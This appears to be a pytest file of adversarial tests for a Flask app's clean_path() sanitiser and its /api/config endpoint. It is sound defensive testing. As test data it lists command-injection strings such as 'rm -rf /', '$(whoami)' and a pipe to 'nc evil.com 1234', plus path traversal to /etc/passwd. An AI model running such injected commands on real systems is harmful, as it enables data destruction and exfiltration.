"""
Adversarial tests for clean_path() and the /api/config path-saving surface.

clean_path() is the primary input-sanitisation function in app.py — every
user-supplied path passes through it. If it strips too much, paths break.
If it strips too little, untrusted input flows into subprocess args and
filesystem operations.

These tests are not regression guards for known bugs — they are deliberate
attempts to break clean_path with input the typical user would never type.
"""

import json
from unittest.mock import patch

import pytest

import app as flask_app

# ---------------------------------------------------------------------------
# Documented behavior: strip surrounding whitespace + matched quotes only
# ---------------------------------------------------------------------------


@pytest.mark.parametrize(
    ("raw", "expected"),
    [
        ('"C:\\Music"', "C:\\Music"),
        ("'C:\\Music'", "C:\\Music"),
        ("  C:\\Music  ", "C:\\Music"),
        ('"  C:\\Music  "', "C:\\Music"),  # quotes then whitespace then path
        ("", ""),
        (None, None),
    ],
)
def test_clean_path_documented_behavior(raw, expected):
    assert flask_app.clean_path(raw) == expected


# ---------------------------------------------------------------------------
# Adversarial: shell metacharacters must pass through unaltered
# (clean_path is NOT a shell escaper — it just trims quotes/whitespace.
# But it must not silently drop or rearrange dangerous chars either.)
# ---------------------------------------------------------------------------


@pytest.mark.parametrize(
    "evil",
    [
        "C:\\Music; rm -rf /",
        "C:\\Music`whoami`",
        "C:\\Music$(whoami)",
        "C:\\Music && calc.exe",
        "C:\\Music | nc evil.com 1234",
        "C:\\Music\nrm -rf /",
        "C:\\Music\r\nDELETE",
        "C:\\Music\x00.txt",  # embedded null
        "C:\\Music\t\tdouble-tab",
    ],
)
def test_clean_path_does_not_silently_alter_shell_metachars(evil):
    """clean_path must not rearrange, escape, or drop shell metacharacters.
    The defense against shell injection is subprocess list-form, not clean_path."""
    result = flask_app.clean_path(evil)
    # All metachars in the original (apart from leading/trailing whitespace)
    # must survive the call. We don't strip these — that's not the function's job.
    assert result is not None
    # The dangerous payload must still be visible in the output, not silently dropped.
    if evil.strip():
        # Strip only leading/trailing whitespace for this comparison
        assert result == evil.strip().strip('"').strip("'").strip()


def test_clean_path_path_traversal_passes_through():
    """clean_path does NOT block ../ traversal — that's the route's job, not clean_path's.
    This test documents the boundary: clean_path is purely cosmetic."""
    assert flask_app.clean_path("..\\..\\..\\Windows\\System32") == "..\\..\\..\\Windows\\System32"
    assert flask_app.clean_path("/etc/../etc/passwd") == "/etc/../etc/passwd"


# ---------------------------------------------------------------------------
# Adversarial: pathological lengths and encodings
# ---------------------------------------------------------------------------


def test_clean_path_handles_very_long_input():
    """A 1MB path should not hang or crash."""
    huge = "C:\\" + ("a" * 1_000_000) + ".mp3"
    result = flask_app.clean_path(huge)
    assert result == huge  # no quotes/whitespace to strip


def test_clean_path_handles_only_whitespace():
    assert flask_app.clean_path("   \t\t  ") == ""


def test_clean_path_handles_only_quotes():
    """A string of only quotes should reduce, not infinite-loop."""
    # current implementation strips one round of each — verify it terminates
    result = flask_app.clean_path('""""')
    assert result == ""


def test_clean_path_handles_unicode():
    """Non-ASCII paths must round-trip correctly — DJs name files in many languages."""
    paths = [
        "C:\\Música\\Café.mp3",
        "C:\\音楽\\曲.flac",
        "/Users/dj/Музыка/трек.wav",
        "C:\\🎵\\track.mp3",
    ]
    for p in paths:
        # Quoted version must strip to the unicode original
        assert flask_app.clean_path(f'"{p}"') == p


def test_clean_path_does_not_strip_unmatched_quotes_in_middle():
    """A quote in the middle of a path (e.g. a filename with an apostrophe) must survive."""
    assert flask_app.clean_path("C:\\Music\\Don't Stop.mp3") == "C:\\Music\\Don't Stop.mp3"
    assert flask_app.clean_path('C:\\Music\\Track "Live".mp3') == 'C:\\Music\\Track "Live".mp3'


def test_clean_path_strips_only_one_layer_of_each_quote_type():
    """Documents current behavior: nested quotes reduce by one of each, not recursively."""
    # current impl: strip whitespace → strip " → strip ' → strip whitespace
    # So "'  path  '" becomes 'path' (the spaces inside the quotes are stripped).
    assert flask_app.clean_path("\"'C:\\Music'\"") == "C:\\Music"


# ---------------------------------------------------------------------------
# Adversarial: /api/config POST with hostile payloads
# ---------------------------------------------------------------------------


@pytest.fixture
def config_client(tmp_path):
    flask_app.app.config["TESTING"] = True
    config_file = tmp_path / "config.json"
    with (
        patch.object(flask_app, "CONFIG_FILE", config_file),
        flask_app.app.test_client() as c,
    ):
        yield c


def test_config_accepts_unicode_paths_via_api(config_client):
    payload = {"db_path": "C:\\Música\\master.db", "music_root": "/Users/dj/音楽"}
    resp = config_client.post(
        "/api/config", data=json.dumps(payload), content_type="application/json"
    )
    assert resp.status_code == 200
    body = resp.get_json()
    assert body["config"]["db_path"] == "C:\\Música\\master.db"


def test_config_does_not_crash_on_extra_unknown_keys(config_client):
    """A payload with unexpected keys must not crash — load_config merges over defaults."""
    payload = {"db_path": "/x", "totally_unknown_key": "value", "__proto__": "evil"}
    resp = config_client.post(
        "/api/config", data=json.dumps(payload), content_type="application/json"
    )
    assert resp.status_code == 200


def test_config_handles_empty_body(config_client):
    """Empty/missing JSON body should not crash — save_config receives {} and merges."""
    resp = config_client.post("/api/config", data="", content_type="application/json")
    # Either 200 with no-op or 400 — but never 500
    assert resp.status_code < 500


def test_config_handles_garbage_json(config_client):
    resp = config_client.post(
        "/api/config", data="{not valid json", content_type="application/json"
    )
    # Flask returns 400 for malformed JSON — but never 500
    assert resp.status_code < 500
